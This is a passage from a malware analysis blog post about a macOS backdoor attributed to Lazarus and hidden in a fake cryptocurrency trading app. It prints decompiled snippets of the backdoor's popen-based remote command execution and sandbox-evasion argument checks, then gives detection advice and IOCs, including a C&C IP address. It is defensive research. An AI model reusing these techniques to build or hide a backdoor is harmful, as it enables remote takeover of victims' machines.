</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    r14 <span style="color:#f92672">=</span> arg1;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    __bzero(<span style="color:#f92672">&amp;</span>var_430, <span style="color:#ae81ff">0x400</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    sprintf(<span style="color:#f92672">&amp;</span>var_430, <span style="color:#e6db74">&#34;%s 2&gt;&amp;1 &amp;&#34;</span>, arg0);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    rax <span style="color:#f92672">=</span> popen(<span style="color:#f92672">&amp;</span>var_430, <span style="color:#e6db74">&#34;r&#34;</span>);</span></span></code></pre></div></p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ man popen

FILE * popen(const char *command, const char *mode);

The popen() function ``opens'' a process by creating a bidirectional pipe, forking, and invoking the shell.

The command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh, using the -c flag; interpretation, if any, is performed by the shell.

</pre>
</div>
<p>The ability to remotely execute commands, clearly gives a remote attacker full and extensible control over the infected macOS system!</p>
<h3 id="connection-to-lazarus-apt-group">Connection to Lazarus APT Group?</h3>
<p>As noted, a closely-related sample was previously analyzed by Kaspersky in their writeup titled: &ldquo;<a href="https://securelist.com/operation-applejeus/87553/">Operation AppleJeus: Lazarus hits cryptocurrency exchange with fake installer and macOS malware</a>&rdquo;</p>
<p>The question arises, is this sample related and how? This is actually a fairly easy question to conclusively: &ldquo;yes&rdquo;. Here we highlight several undeniable similarities and identicalities:</p>
<ul>
<li>
<p>The infection mechanism is essentially identical <br>
In both attacks, the APT group created a legitimately looking cryptocurrency company that hosted the malware.</p>
</li>
<li>
<p>The <code>.pkg</code>s from both attacks share a similar layout. Specifically an <code>postinstall</code> script will persistently install the malware as a launch daemon, extracting a hidden plist from the applications&rsquo; <code>/Resources</code> directory.\</p>
</li>
<li>
<p>Though both samples are signed, neither are signed with a Apple developer ID. This is rather unusual.</p>
</li>
<li>
<p>Both malware samples are persisted as launch daemons that require a single commandline argument in order to execute. Comparing the two samples, though the logic is inverted (likely due to compiler differences), the following code snippets illustrate this similarity:</p>
</li>
</ul>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//sample 1
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    <span style="color:#75715e">//check arg 1
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((arg0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">&amp;&amp;</span> (strcmp(arg1, <span style="color:#e6db74">&#34;CheckUpdate&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#75715e">//go
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#75715e"></span>}</span></span></code></pre></div>\</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//sample 2
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    <span style="color:#75715e">//check arg 1
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((arg0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">||</span> (strcmp(arg1, <span style="color:#e6db74">&#34;Maintain&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#75715e">//exit
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#75715e"></span>}</span></span></code></pre></div>\</p>
<p>Kaspersky (in their original analysis) of another Lazarus backdoor stated:</p>
<blockquote>
<p>&ldquo;Apparently the command-line argument is the way to prevent the detection of its malicious functionality via sandboxes or even reverse engineering. We have previously seen this technique adopted by Lazarus group in 2016 in attacks against banks. As of 2018, it is still using this in almost every attack we investigated.&rdquo;</p>
</blockquote>
<ul>
<li>There are many other similarities both samples (e.g. constants, etc) that again highlight a strong relationship between the two attacks. For example both samples look for the C&amp;C server to return the same three bytes, &ldquo;200&rdquo;:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//previous sample
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span>var_70 <span style="color:#f92672">=</span> QString<span style="color:#f92672">::</span>fromAscii_helper(<span style="color:#e6db74">&#34;200&#34;</span>, <span style="color:#ae81ff">0x3</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>rax <span style="color:#f92672">=</span> QString<span style="color:#f92672">::</span>compare(<span style="color:#f92672">&amp;</span>var_40, <span style="color:#f92672">&amp;</span>var_70, <span style="color:#ae81ff">0x1</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span><span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xffffffff</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>   ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>}</span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">//current sample
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ((var_1C <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x3</span>) <span style="color:#f92672">&amp;&amp;</span> (strcmp(r14, <span style="color:#e6db74">&#34;200&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>}</span></span></code></pre></div>
<p>IMHO, without a doubt, both malware specimen&rsquo;s where written by the APT group: Lazarus.</p>
<p>However, though both malware samples are written by the same APT group, the samples are not the same.</p>
<p>First, as noted by Kaspersky in their writeup on the previous Lazarus backdoor, that backdoor was &ldquo;implemented using a cross-platform QT framework.&rdquo; The sample we looked at today, is solely created for macOS (there is no cross-platform code).</p>
<p>The previous backdoor also &ldquo;collects basic system information &hellip; such as host name, OS type and version, System architecture, OS kernel type and version&rdquo; Today&rsquo;s specimen does not appear to contain this functionality.</p>
<p>Finally the commands supported by today&rsquo;s sample, appear to be be unique to this sample. That is to say, the command strings (&ldquo;exit&rdquo;, &ldquo;up&rdquo;, &ldquo;kcon&rdquo;) do not appear in the specimen previously analyzed by Kaspersky.</p>
<p>Recall also that the malware we analyzed today contained a version 1.0 string:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>_g_version:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#ae81ff">0x0000000100003414</span>  dd  <span style="color:#ae81ff">0x00000001</span></span></span></code></pre></div>
<p>&hellip;perhaps our sample is a precursor to the more comprehensive sample uncovered and analyzed by Kaspersky? Or perhaps its a completely separate Lazarus backdoor.</p>
<h3 id="detection">Detection</h3>
<p>As this malware is not particularly sophisticated, it&rsquo;s actually fairly easy to detect. Unfortunately at the time of analysis, no engines on VirusTotal detected the malware:</p>
<p><img src="../images/blog/blog_0x49/vt.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

\</p>
<div class="note">
It should be noted that for any particular AV engine (on VirusTotal), said engine may only be one (small?) piece of a more complete security product.
<p>That is to say, a company’s comprehensive security product may also include a behavior-based engine (not included on VirusTotal) that perhaps could generically detect this new threat.</p>
</div>
<p>Of course, behavior-based tools have no problem detecting the malware&rsquo;s malicious activity (even with no a priori knowledge of the malware).</p>
<p>First, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> will alert when the malware attempts to persist as a launch daemon:
<img src="../images/blog/blog_0x49/blockblock.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

Similarly, a system scanned with <a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> will show the malware as a persistent launch daemon:</p>
<img src="../images/blog/blog_0x49/knockknock.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>If <a href="https://objective-see.com/products/knockknock.html">LuLu</a> is installed, it will generate an alert when the malware attempts to connect out to it&rsquo;s C&amp;C server for tasking:</p>
<img src="../images/blog/blog_0x49/lulu.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>And finally, <a href="https://objective-see.com/products/netiquette.html">Netiquette</a> (which enumerates active network connections), will show the malware connection to its remote C&amp;C server (<code>185.228.83.32</code>):</p>
<img src="../images/blog/blog_0x49/netiquette.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>In terms of manual detection (IOCs), the following should suffice:</p>
<ul>
<li>
<p>The malware&rsquo;s launch daemon plist file: <code>/Library/LaunchDaemons/org.jmttrading.plist</code></p>
</li>
<li>
<p>The malware&rsquo;s persistent binary, installed at <code>/Library/JMTTrader/CrashReporter</code> or running:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ps aux | grep JMTTrader/CrashReporter 
root  /Library/JMTTrader/CrashReporter Maintain
</pre>
</div></p>
</li>
</ul>
<h3 id="conclusion">Conclusion</h3>
<p>It&rsquo;s not everyday we get a new macOS malware specimen to tear apart, especially one written by a reasonably sophisticated APT group. (Mahalo again to <a href="https://twitter.com/malwrhunterteam/">@malwrhunterteam</a> for uncovering this sample and bringing it to my attention!)</p>
<p>Today, we analyzed a (new?) Lazarus backdoor that affords a remote attacker complete command and control over infected macOS systems.</p>
<p>Do you have to worry about getting infected? Probably not, unless you&rsquo;re an employee working at a crypto-currency exchange.</p>
<p>But either way, our free (largely) open-source <a href="https://objective-see.com/products.html">security tools</a> can generically provide protection against this and other macOS threats! 🥳
\</p>
<div class="note">
<center>
❤️ Love these blog posts and/or want to support my research and tools? 
\
You can support them via my [Patreon](https://www.patreon.com/bePatron?c=701171) page!
\
</center></div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>